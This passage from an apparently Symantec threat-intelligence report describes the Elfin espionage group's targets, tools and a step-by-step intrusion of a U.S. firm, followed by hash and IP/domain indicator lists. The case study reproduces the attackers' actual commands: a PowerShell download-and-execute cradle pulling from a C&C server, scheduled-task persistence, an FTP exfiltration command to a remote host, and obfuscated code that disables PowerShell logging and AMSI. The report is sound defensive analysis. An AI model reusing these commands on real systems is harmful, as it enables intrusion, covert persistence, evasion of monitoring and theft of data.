It has\ncompromised a wide range of targets, including governments along with organizations in the research, chemical,\nengineering, manufacturing, consulting, finance, telecoms, and several other sectors.\nSHAREPOSTED: 27 MAR, 2019 8 MIN READ THREAT INTELLIGENCEBlogs Threat Intelligence/ Menu\n Figure 1. Elfin attacks by country, 2016 -2019\nMany U.S. targets\nElfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec\nsince the beginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18\norganizations attacked over the past three years, including a number of Fortune 500 companies.\nElfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance,\nIT, and healthcare sectors.\nFigure 2. Elfin attacks by sector, 2016-2019\nSome of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In\none instance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also\ncompromised.\nFigure 3. Elfin attacks by month, 2016-2019\nVulnerability exploitation\nIn a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in\nWinRAR, the widely used file archiving and compression utility capable of creating self-extracting archive files. The\nexploit was used against one target in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched\ncomputer, the vulnerability could permit an attacker to install any file on the computer, which effectively permits code\nexecution on the targeted computer.\nTwo users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR\nvulnerability. This file was likely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec\nhad rolled out proactive protection against any attempt to exploit this vulnerability ( Exp.CVE-2018-20250 ). This\nprotection successfully protected the targeted organization from being compromised.\nThe Shamoon connection\nElfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon\nvictim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware\n(Trojan.Stonedrill ) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close\ntogether, there has been speculation that the two groups may be linked. However, Symantec has found no further\nevidence to suggest Elfin was responsible for these Shamoon attacks to date.  We continue to monitor the activities of\nboth groups closely.\nElfin’s toolset\nElfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source\nhacking tools.\nCustom malware used by the group include:\nNotestuk ( Backdoor.Notestuk ) (aka TURNEDUP): Malware that can be used to open a backdoor and gather\ninformation from a compromised computer.\nStonedrill ( Trojan.Stonedrill ): Custom malware capable of opening a backdoor on an infected computer and\ndownloading additional files. The malware also features a destructive component, which can wipe the master boot\n record of an infected computer.\nAutoIt backdoor: A custom built backdoor written in the AutoIt scripting language.\nIn addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on\nthe cyber underground. These include:\nRemcos ( Backdoor.Remvio ): A commodity remote administration tool (RAT) that can be used to steal information\nfrom an infected computer.\nDarkComet ( Backdoor.Breut ): Another commodity RAT used to open a backdoor on an infected computer and steal\ninformation.\nQuasar RAT ( Trojan.Quasar ): Commodity RAT that can be used to steal passwords and execute commands on an\ninfected computer.\nPupy RAT ( Backdoor.Patpoopy ): Commodity RAT that can open a backdoor on an infected computer.\nNanoCore ( Trojan.Nancrat ): Commodity RAT used to open a backdoor on an infected computer and steal\ninformation.\nNetWeird ( Trojan.Netweird.B ): A commodity Trojan which can open a backdoor and steal information from the\ncompromised computer. It may also download additional potentially malicious files.\nElfin also makes frequent use of a number of publicly available hacking tools, including:\nLaZagne ( SecurityRisk.LaZagne ): A login/password retrieval tool\nMimikatz ( Hacktool.Mimikatz ): Tool designed to steal credentials\nGpppassword: Tool used to obtain and decrypt Group Policy Preferences (GPP) passwords\nSniffPass ( SniffPass ): Tool designed to steal passwords by sniffing network traffic\nCase study: How an Elfin attack unfolds\nIn this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in\nthe organization’s local time), an email was sent to the organization advertising a job vacancy at an American global\nservice provider. The email contained a malicious link to hxxp://mynetwork.ddns[DOT].net:880.\nThe recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn\nloaded content from a C&C server via an embedded iframe. At the same time, code embedded within this file also\nexecuted a PowerShell command to download and execute a copy of chfeeds.vbe from the C&C server.\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};IEX(New-Object\nNet.WebClient).DownloadString('hxxps://217.147.168[DOT]46:8088/index.jpg');\nA second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple\ntimes a day.\na.run('%windir%\\\\System32\\\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN \"1\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 01:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"3\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 03:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"5\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 05:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"7\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 07:00 /f &&\nschtasks.exe /CREATE /SC DAILY /TN \"9\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 09:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"11\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 11:00 /f\n&& schtasks.exe /CREATE /SC DAILY /TN \"13\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 13:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"15\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 15:00 /f\n&& schtasks.exe /CREATE /SC DAILY /TN \"17\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 17:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"19\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 19:00 /f\n&& schtasks.exe /CREATE /SC DAILY /TN \"21\" /TR\n\"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 21:00 /f && schtasks.exe /CREATE\n/SC DAILY /TN \"23\" /TR \"C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds\\\\chfeeds.vbe\" /ST 23:00 /f ')\nThe chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This\nscript in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from\nthe C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised\nmachine and proceeded to download the archiving tool WinRAR.\n89.34.237.118   808   hxxp://89.34.237[DOT]118:808/Rar32.exe\nAt 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager.\n192.119.15.35   880   hxxp://mynetwork.ddns[DOT]net:880/st-36-p4578.ps1\nThis tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13.\nTwo days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that\ncommunicated with a C&C server (217.147.168.123). Quasar RAT was installed to\nCSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe.\nAt this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the\nattackers were observed downloading a custom .NET FTP tool to the infected computer.\n192.119.15.36   880   hxxp://192.119.15[DOT]36:880/ftp.exe\nLater at 6:56, the attackers exfiltrated data using this FTP tool to a remote host:\n JsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\appdata\\roaming\\adobe\\rar -a ftp://89.34.237.118:2020 -f\n/[REDACTED] -u [REDACTED] -p [REDACTED]\nActivity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second\ncustom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was\nthen installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate\ndata at a faster rate than traditional FTP clients.\nAt this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a\nsecond remote access tool known as DarkComet was deployed to\ncsidl_profile\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\smss.exe on the infected computer.\nThis was quickly followed 15 seconds later by the installation of a credential dumping to\ncsidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell commands via\nPowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine.\n$GPF=[Ref].AsSeMBLy.GeTTYPe('System.Management.Automation.Utils').\"GEtFiE`LD\"\n('cachedGroupPolicySettings','N'+'onPublic,Static');If($GPF)\n{$GPC=$GPF.GeTVALUE($NUlL);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']\n['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$vAL=\n[COlLecTIons.GEneRic.DIctIoNARy[stRiNG,SyStEM.Object]]::nEw();$VAL.ADD('EnableScriptB'+'lockLogging',0);$VaL.Add\n('EnableScriptBlockInvocationLogging',0);$GPC\n['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$VaL}ELSe{[SCRIPTBLOck].\"GEtFiE`Ld\"\n('signatures','N'+'onPublic,Static').SETVAlue($NuLL,(New-ObjeCt ColLectiONs.GeNERic.HASHSEt[StrInG]))}\n[REF].AssemBLy.GetTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%\n{$_.GEtFielD('amsiInitFailed','NonPublic,Static').SETValUe($nUll,$TrUE)};\nActivity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor\nwere deployed along with further credential dumping activities.\nActive and agile attacker\nElfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations\nacross a diverse range of sectors. Over the past three years, the group has utilized a wide array of tools against its\nvictims, ranging from custom built malware to off-the-shelf RATs, indicating a willingness to continually revise its tactics\nand find whatever tools it takes to compromise its next set of victims.\nProtection/Mitigation\nSymantec has the following protection in place to protect customers against these attacks:\nFile-based protection\nBackdoor.Notestuk\nTrojan.Stonedrill\nBackdoor.Remvio\nBackdoor.Breut\nTrojan.Quasar\nBackdoor.Patpoopy\nTrojan.Nancrat\nTrojan.Netweird.B\nExp.CVE-2018-20250\nSecurityRisk.LaZagne\nHacktool.Mimikatz\nSniffPass\n​SHA2 Description\n5798aefb07e12a942672a60c2be101dc26b01485616713e8be1f68b321747f2f Notestuk/TURNEDUP\na67461a0c14fc1528ad83b9bd874f53b7616cfed99656442fb4d9cdd7d09e449 AutoIt backdoor\nf2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5 Gpppassword\n87e2cf4aa266212aa8cf1b1c98ae905c7bac40a6fc21b8e821ffe88cf9234586 LaZagne\n709df1bbd0a5b15e8f205b2854204e8caf63f78203e3b595e0e66c918ec23951 LaZagne\na23c182349f17398076360b2cb72e81e5e23589351d3a6af59a27e1d552e1ec0 Quasar RAT\n0b3610524ff6f67c59281dbf4a24a6e8753b965c15742c8a98c11ad9171e783d Quasar RAT\nd5262f1bc42d7d5d0ebedadd8ab90a88d562c7a90ff9b0aed1b3992ec073e2b0 Quasar RAT\nae1d75a5f87421953372e79c081e4b0a929f65841ed5ea0d380b6289e4a6b565 Remcos\ne999fdd6a0f5f8d1ca08cf2aef47f5ddc0ee75879c6f2c1ee23bc31fb0f26c70 Remcos\n018360b869d8080cf5bcca1a09eb8251558378eb6479d8d89b8c80a8e2fa328c Remcos\n367e78852134ef488ecf6862e71f70a3b10653e642bda3df00dd012c4e130330 Remcos\nea5295868a6aef6aac9e117ef128e9de107817cc69e75f0b20648940724880f3 Remcos\n6401abe9b6e90411dc48ffc863c40c9d9b073590a8014fe1b0e6c2ecab2f7e18 SniffPass\nbf9c589de55f7496ff14187b1b5e068bd104396c23418a18954db61450d21bab DarkComet\naf41e9e058e0a5656f457ad4425a299481916b6cf5e443091c7a6b15ea5b3db3 DarkComet\nc7a2559f0e134cafbfc27781acc51217127a7739c67c40135be44f23b3f9d77b AutoIt FTP tool\n ​SHA2 Description\n99c1228d15e9a7693d67c4cb173eaec61bdb3e3efdd41ee38b941e733c7104f8 .NET FTP tool\n94526e2d1aca581121bd79a699a3bf5e4d91a4f285c8ef5ab2ab6e9e44783997 PowerShell downloader (registry.ps1)\ndedfbc8acf1c7b49fb30af35eda5e23d3f7a202585a5efe82ea7c2a785a95f40 POSHC2 backdoor\n​IP Domain\n95.211.191.117 update-sec.com\n8.26.21.120 mynetwork.ddns.net\n162.250.145.234 mynetwork.ddns.net\n91.235.142.76 mywinnetwork.ddns.net\n8.26.21.119 hyperservice.ddns.net\n8.26.21.120 [REDACTED].ddns.net\n213.252.244.14 service-avant.com\n91.235.142.124 mywinnetwork.ddns.net\n8.26.21.120 mynetwork.ddns.net\n162.250.145.234 mynetwork.ddns.net\n91.235.142.76 mywinnetwork.ddns.net\n8.26.21.120 [REDACTED].ddns.net\n8.26.21.120 [REDACTED].ddns.net\n95.211.191.117 update-sec.com\n5.187.21.70 microsoftupdated.com\n217.13.103.46 securityupdated.com\n8.26.21.120 [REDACTED].ddns.net\n5.187.21.71 backupnet.ddns.net\n91.230.121.143 backupnet.ddns.net\n8.26.21.119 [REDACTED].ddns.net\n8.26.21.117 srvhost.servehttp.com\n37.48.105.178 servhost.hopto.org\n8.26.21.117 srvhost.servehttp.com\n5.187.21.70 microsoftupdated.com\n64.251.19.214 mynetwork.ddns.net\n64.251.19.217 [REDACTED].servehttp.com\n64.251.19.214 [REDACTED].ddns.net\n64.251.19.214 mynetwork.ddns.net\n64.251.19.214 [REDACTED].sytes.net\n64.251.19.217 [REDACTED].myftp.org\n64.251.19.216 srvhost.servehttp.com\n64.251.19.217 [REDACTED].myftp.org\n64.251.19.217 [REDACTED].myftp.org\n64.251.19.215 [REDACTED].myftp.org\n64.251.19.217 [REDACTED].myftp.org\n64.251.19.216 [REDACTED].myftp.org\n64.251.19.232 mynetwork.ddns.net\n64.251.19.214 [REDACTED].ddns.net\n162.250.145.204 mynetwork.ddns.net\n188.165.4.81 svcexplores.com\n64.251.19.231 mynetwork.ddns.net\n64.251.19.231 [REDACTED].ddns.net\n64.251.19.232 [REDACTED].ddns.net\n64.251.19.216 [REDACTED].myftp.biz\n91.230.121.143 remote-server.ddns.net\n162.250.145.222 [REDACTED].ddns.net\n64.251.19.216 [REDACTED].redirectme.net\n8.26.21.222 mynetwork.ddns.net\n8.26.21.223 [REDACTED].ddns.net\n217.147.168.44 remserver.ddns.net\n ​IP Domain\n SUBSCRIBE Privacy Policy Cookie Policy Data Processing and Data Transfers Supplier Responsibility Terms of Use Sitemap\nCopyright © 2005-2020 Broadcom.
